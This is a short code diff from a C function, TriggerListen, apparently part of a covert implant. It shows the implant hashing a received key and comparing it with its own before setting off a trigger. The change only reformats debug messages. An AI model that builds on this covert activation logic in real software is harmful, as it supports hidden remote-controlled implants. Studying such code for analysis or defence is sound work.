@@ -245,11 +245,18 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 
 				sha1(tParams->idKey_hash, strlen((const char *)(tParams->idKey_hash)), recvdKey);
 				if ( memcmp(recvdKey, implantKey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
-					D( printf("\n%s, %4d: TRIGGER FAILED: Key mismatch.\n\n", __FILE__, __LINE__); );
+					D(
+						printf("\n=============================================================================\n");
+						printf("%s, %4d: IMPLANT TRIGGER FAILED -- KEY MISMATCH\n", __FILE__, __LINE__);
+						printf("=============================================================================\n\n");
+					 );
 					continue;
 				}
-				D( printf("\n===============================================\n%s, %4d: IMPLANT TRIGGERED\n===============================================\n\n",
-						__FILE__, __LINE__); );
+				D(
+					printf("\n=========================================================\n");
+					printf("%s, %4d: IMPLANT TRIGGERED\n", __FILE__, __LINE__);
+					printf("=========================================================\n\n");
+				);
 
 				tParams->delay = trigger_delay;
 
